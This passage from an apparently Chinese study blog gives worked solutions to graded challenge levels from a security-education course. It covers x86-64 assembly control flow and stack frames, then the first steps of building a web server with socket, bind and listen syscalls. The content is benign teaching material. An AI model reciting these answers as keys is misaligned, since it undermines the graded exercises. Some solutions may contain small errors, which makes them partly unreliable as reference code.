class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jmp next # next是代码段标签</span><br><span class="line"></span><br><span class="line">.rept 0x51</span><br><span class="line">nop</span><br><span class="line">.endr</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">  pop rdi</span><br><span class="line">  mov rax, 0x403000</span><br><span class="line">  jmp rax #这里不能直接 jmp 0x403000</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level25：条件转移指令，注意题目中的<strong>“Assume eachdereferenced value is a signed dword（4字节即32位）.”</strong></p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [rdi]  #题目限定了数据为32位</span><br><span class="line">cmp ebx, 0x7f454c46</span><br><span class="line">jne c2</span><br><span class="line"></span><br><span class="line">c1:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  add eax, [rdi+8]</span><br><span class="line">  add eax, [rdi+12]</span><br><span class="line">  jmp done</span><br><span class="line">c2:</span><br><span class="line">  cmp ebx, 0x00005A4D</span><br><span class="line">  jne c4</span><br><span class="line">c3:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  sub eax, [rdi+8]</span><br><span class="line">  sub eax, [rdi+12]</span><br><span class="line">  jmp done</span><br><span class="line">c4:</span><br><span class="line">  mov eax, [rdi+4]</span><br><span class="line">  imul eax, [rdi+8]</span><br><span class="line">  imul eax, [rdi+12]</span><br><span class="line">done:</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level26：switch条件判断，利用跳转表实现条件跳转</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax,rdi</span><br><span class="line">and rax,0xfffffffffffffffc  # 清空低2位，若 rdi 大于3，则 and 操作后 rax 的值不为0</span><br><span class="line">je next</span><br><span class="line"></span><br><span class="line">jmp [rsi + 4*8]</span><br><span class="line">next:</span><br><span class="line">  jmp [rsi + rdi*8]</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level27：for循环</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">and rax, 0</span><br><span class="line">mov rbx, 0</span><br><span class="line">L1:</span><br><span class="line">  cmp rsi, 0</span><br><span class="line">  je next</span><br><span class="line"></span><br><span class="line">L2:</span><br><span class="line">  sub rsi, 1</span><br><span class="line">  add rax, [rdi]</span><br><span class="line">  add rdi, 8</span><br><span class="line">  add rbx, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">  div rbx</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level28：while循环</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0</span><br><span class="line">cmp rdi, 0</span><br><span class="line">je L2  # 若 rdi 为0，则 rax 直接为0</span><br><span class="line">L1:</span><br><span class="line">  mov rbx, [rdi + rax]</span><br><span class="line">  cmp rbx, 0</span><br><span class="line">  je L2</span><br><span class="line">  add rax, 1</span><br><span class="line">  jmp L1</span><br><span class="line">L2:</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level29：函数调用——call、ret。若只有一个参数，则该参数一般会被存放在 rdi 中</p><blockquote><p>函数的参数参考下表：</p><table><thead><tr class="header"><th style="text-align: center;">Argument type</th><th style="text-align: center;">Registers</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Integer/pointer arguments 1-6</td><td style="text-align: center;">RDI, RSI, RDX, RCX, R8, R9</td></tr><tr class="even"><td style="text-align: center;">Floating point arguments 1-8</td><td style="text-align: center;">XMM0 - XMM7</td></tr><tr class="odd"><td style="text-align: center;">Excess arguments</td><td style="text-align: center;">Stack</td></tr><tr class="even"><td style="text-align: center;">Static chain pointer</td><td style="text-align: center;">R10</td></tr></tbody></table></blockquote><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">str_lower:</span><br><span class="line">  mov rbx, 0</span><br><span class="line">  cmp rdi, 0</span><br><span class="line">  jne L1</span><br><span class="line">  jmp done</span><br><span class="line"></span><br><span class="line">L1:</span><br><span class="line">  mov cl, [rdi]</span><br><span class="line">  cmp cl, 0  # 不能直接通过内存地址进行比较</span><br><span class="line">  jne L2</span><br><span class="line">  jmp done</span><br><span class="line"></span><br><span class="line">L2:</span><br><span class="line">  cmp cl, 0x5a</span><br><span class="line">  jbe L3  # 小于等于（无符号数）</span><br><span class="line">  add rdi, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">L3:</span><br><span class="line">  push rdi # 暂存 rdi 的值</span><br><span class="line">  mov dil, [rdi]  # 注意foo函数的参数是[rdi]，不是 rdi</span><br><span class="line">  mov rdx, 0x403000</span><br><span class="line">  call rdx  # call后不能直接加地址，需要寄存器作为中转</span><br><span class="line">  pop rdi # 回复 rdi 的值</span><br><span class="line">  mov [rdi], al</span><br><span class="line">  add rbx, 1</span><br><span class="line">  jmp L1</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">  mov rax, rbx</span><br><span class="line">  ret</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level30：函数栈帧</p><p>伪代码：</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">most_common_byte(src_addr, size):</span><br><span class="line">  i = 0</span><br><span class="line">  while i &lt;= size-1:</span><br><span class="line">    curr_byte = [src_addr + i]</span><br><span class="line">    [stack_base - curr_byte] += 1</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">  b = 0</span><br><span class="line">  max_freq = 0</span><br><span class="line">  max_freq_byte = 0</span><br><span class="line">  while b &lt;= 0xff:</span><br><span class="line">    if [stack_base - b] &gt; max_freq:</span><br><span class="line">      max_freq = [stack_base - b]</span><br><span class="line">      max_freq_byte = b</span><br><span class="line">    b += 1</span><br><span class="line"></span><br><span class="line">  return max_freq_byte</span><br></pre></td></tr></tbody></table></figure><p></p><p>WP：（两个参数分别是rdi，rsi）参考https://www.freebuf.com/articles/database/321326.html</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">push 0                      # 预留一个空位，确保栈对齐 (因为数组下标从0开始，但是栈顶有其他数据，所以需要先push)</span><br><span class="line">mov rbp, rsp                # 保存当前的栈顶指针</span><br><span class="line">mov rax, -1                 # 初始化索引为 -1</span><br><span class="line">sub rsi, 1                  # 数组大小减 1</span><br><span class="line">sub rsp, rsi                # 为数组分配栈空间</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">    add rax, 1              # 索引加 1</span><br><span class="line">    cmp rax, rsi            # 比较 rax 和 rsi</span><br><span class="line">    jg next                 # 如果 rax &gt; rsi，跳转到 next</span><br><span class="line">    nop</span><br><span class="line">    mov cl, [rdi + rax]     # 取数组中的当前字节 curr_byte</span><br><span class="line">    mov r11, rbp            # 将 rbp 移动到 r11 中</span><br><span class="line">    sub r11, rcx            # 计算栈基地址减去 curr_byte 的地址</span><br><span class="line">    mov dl, [r11]           # 取该地址的值</span><br><span class="line">    add dl, 1               # 计数加 1</span><br><span class="line">    mov [r11], dl           # 存回该地址</span><br><span class="line">    jmp loop1               # 循环</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">mov rax, 0                  # 初始化 rax 为 0</span><br><span class="line">mov rbx, rax                # 初始化 rbx 为 0</span><br><span class="line">mov rcx, rax                # 初始化 rcx 为 0</span><br><span class="line">mov ax, -1                  # 初始化 ax 为 -1</span><br><span class="line"></span><br><span class="line">loop2:</span><br><span class="line">    add ax, 1               # b 加 1</span><br><span class="line">    cmp ax, 0xff            # 比较 b 和 0xff</span><br><span class="line">    jg return               # 如果 b &gt; 0xff，跳转到 return</span><br><span class="line">    nop</span><br><span class="line">    mov r11, rbp            # 将 rbp 移动到 r11 中</span><br><span class="line">    sub r11, rax            # 计算栈基地址减去 b 的地址</span><br><span class="line">    mov dl, [r11]           # 取该地址的值</span><br><span class="line">    cmp dl, bl              # 比较该地址的值和 max_freq</span><br><span class="line">    jle loop2               # 如果该值 &lt;= max_freq，跳转到 loop2</span><br><span class="line">    nop</span><br><span class="line">    mov bl, dl              # 否则更新 max_freq</span><br><span class="line">    mov cl, al              # 更新 max_freq_byte</span><br><span class="line">    jmp loop2               # 循环</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">return:</span><br><span class="line">mov rax, rcx                # 返回 max_freq_byte</span><br><span class="line">mov rsp, rbp                # 恢复栈顶指针</span><br><span class="line">pop rbx                     # 弹出预留的空位</span><br><span class="line">ret                         # 返回</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p></p></li></ul><h2 id="building-a-web-server">Building a Web Server</h2><h3 id="知识点-2">知识点</h3><ul><li><p>syscall（系统调用），用户通过系统调用访问内核提供的服务从而能够间接控制硬件</p><p>https://x64.syscall.sh/可查看详细的系统调用函数，每个参数对应不同的<strong>寄存器</strong></p></li><li><p>network system call：</p><ul><li><code>int socket(int domain, int type, int protocal)</code>：socket()creates an endpoint for communication and returns a file descriptor thatrefers to that endpoint.（即该函数返回 sockfd）</li><li><code>int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen)</code>：将地址分配给socket</li><li><code>int listen(int sockfd, int backlog)</code>：将对应的 socket标记为 passive(被动)socket，被动套接字被用于连接请求（利用accept函数）</li><li><code>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)</code>：连接socket，并创建新的 sockfd</li></ul></li><li><p><code>fork()</code>系统调用创建新的子进程，调用<code>fork()</code>后，会产生<strong>两个返回值</strong>，一个（子进程ID）在父进程中返回，另一个（0）在子进程中返回。下面是一个示例：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">pid_t</span> pid = fork(); <span class="comment">// 创建一个新进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// fork() 调用失败</span></span><br><span class="line">        perror(<span class="string">"fork failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// 这是子进程中执行的代码，getpid()获取是当前进程ID（即子进程ID）</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This is the child process. PID: %d\n"</span>, getpid());</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">// 这是父进程中执行的代码，pid为子进程ID</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This is the parent process. Parent PID: %d  Child PID: %d\n"</span>, getpid(), pid);</span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// 等待子进程结束</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>父进程和子进程共享文件描述符，但拥有独立的内存空间。若父进程通过close 关闭了某文件，子进程不受影响</p></blockquote></li><li><p><code>close(int fd)</code>系统调用：关闭文件</p></li><li><p>总结：</p><blockquote><ul><li><p>使用 <code>socket()</code> 创建一个 TCP 套接字。</p></li><li><p>使用 <code>bind()</code>将套接字绑定到指定的地址和端口。</p></li><li><p>使用 <code>listen()</code> 开始监听传入的连接。</p></li><li><p>使用 <code>accept()</code>接受客户端连接，这会创建一个新的套接字来处理客户端通信。</p></li></ul></blockquote></li></ul><h3 id="练习-2">练习</h3><ul><li><p>level1：程序退出。</p><p>wp：直接运行默认给出的步骤</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     # SYS_exit（这一步可查表 https://x64.syscall.sh/）</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li><li><p>level2：创建一个套接字。</p><p>wp：这题没给提示<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，参考教学视频里的代码<code>socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</code>，但是汇编语言无法识别这些字符串，需要找到<strong>对应的整数值</strong>，这里需要阅读Linux的源码。</p><p><strong>Linux源码阅读网站</strong>：https://elixir.bootlin.com/linux/latest/source</p><p>三个参数对应的整数值如下(分别位于在三个文件中)：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// domain 用于确定协议族</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX1<span class="comment">/* Unix domain sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LOCAL1<span class="comment">/* POSIX name for AF_UNIX*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET2<span class="comment">/* Internet IP Protocol */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_AX253<span class="comment">/* Amateur Radio AX.25 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX4<span class="comment">/* Novell IPX */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK5<span class="comment">/* AppleTalk DDP */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETROM6<span class="comment">/* Amateur Radio NET/ROM */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BRIDGE7<span class="comment">/* Multiprotocol bridge */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMPVC8<span class="comment">/* ATM PVCs*/</span></span></span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// type</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sock_type</span> {</span></span><br><span class="line">SOCK_STREAM= <span class="number">1</span>,</span><br><span class="line">SOCK_DGRAM= <span class="number">2</span>,</span><br><span class="line">SOCK_RAW= <span class="number">3</span>,</span><br><span class="line">SOCK_RDM= <span class="number">4</span>,</span><br><span class="line">SOCK_SEQPACKET= <span class="number">5</span>,</span><br><span class="line">SOCK_DCCP= <span class="number">6</span>,</span><br><span class="line">SOCK_PACKET= <span class="number">10</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// protocol</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> {</span></span><br><span class="line">  IPPROTO_IP = <span class="number">0</span>,<span class="comment">/* Dummy protocol for TCP*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IPIPPROTO_IP</span></span><br><span class="line">  IPPROTO_ICMP = <span class="number">1</span>,<span class="comment">/* Internet Control Message Protocol*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_ICMPIPPROTO_ICMP</span></span><br><span class="line">  IPPROTO_IGMP = <span class="number">2</span>,<span class="comment">/* Internet Group Management Protocol*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IGMPIPPROTO_IGMP</span></span><br><span class="line">  IPPROTO_IPIP = <span class="number">4</span>,<span class="comment">/* IPIP tunnels (older KA9Q tunnels use 94) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_IPIPIPPROTO_IPIP</span></span><br><span class="line">  IPPROTO_TCP = <span class="number">6</span>,<span class="comment">/* Transmission Control Protocol*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_TCPIPPROTO_TCP</span></span><br><span class="line">  IPPROTO_UDP = <span class="number">17</span>,<span class="comment">/* User Datagram Protocol*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IPPROTO_UDPIPPROTO_UDP</span></span><br><span class="line">... <span class="comment">// 省略了很多</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>该题的完整代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0     # 将 protocol 参数设置为 0，它意味着使用默认协议。对于 AF_INET 和 SOCK_STREAM 的组合，默认协议就是 TCP；或者直接明确协议，将参数设为 6</span><br><span class="line">    mov rax, 41    # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 0  # 注意要退出程序</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li><li><p>level3：使用bind（<code>int bind(int sockfd, struct sockaddr *addr, socklen_t addrlen)</code>）为socket分配地址和端口。</p><p>wp：运行<code>/challeng/run</code>还是啥提示都没有，直接运行<code>/challenge/run ./server</code>，得到</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure><p>发现需要绑定的端口和地址，下面分析结构体<code>sockaddr</code>和<code>sockaddr_in</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> {</span></span><br><span class="line">    <span class="type">sa_family_t</span> sa_family;  <span class="comment">// address family, e.g., AF_INET, AF_INET6</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];       <span class="comment">// protocol address</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> {</span></span><br><span class="line">    <span class="type">sa_family_t</span>    sin_family;  <span class="comment">// address family: AF_INET  （2字节）</span></span><br><span class="line">    <span class="type">in_port_t</span>      sin_port;    <span class="comment">// port in network byte order  （2字节）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>    <span class="comment">// internet address          （4字节）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>  sin_zero[<span class="number">8</span>]; <span class="comment">// padding to match sizeof(struct sockaddr)  （8字节）</span></span><br><span class="line">};</span><br><span class="line"><span class="comment">// 由上述结构体可知 addrlen 默认为 16</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>这题使用的是 <code>sockaddr_in</code>，<code>sockaddr_in</code> 是<code>sockaddr</code> 结构的一个具体版本，专门用于 IPv4地址族。这里使用栈来存放结构体的参数，<strong>注意字节顺序</strong>，然后返回<code>rsp</code>作为指针</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0  # 填充字节</span><br><span class="line">    push 0x0000000050000002  # 实际内存中的顺序为：0200（2） 0050（80） 00000000（0.0.0.0）</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp   # 传入结构体指针</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li><li><p>level4：<code>int listen(int sockfd, int backlog)</code>利用listen监听socket（backlog参数表示队列大小）</p><p>listen详解参考：https://xiaoxiami.gitbook.io/linux-server/socket/socket-xiang-guan-han-shu/shi-yong-listen-he-accept-han-shu</p><p>wp：通过运行<code>/challenge/run ./server</code>得到<code>listen(3, 0) = 0</code>，两个参数即可，第一个参数就是socket对应的整数值<code>socketfd</code>，正好level3中的<code>bind</code>操作将<code>socketfd</code>传给了<code>rdi</code>，因此可以省略这一步，直接设置第二个参数即可</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span 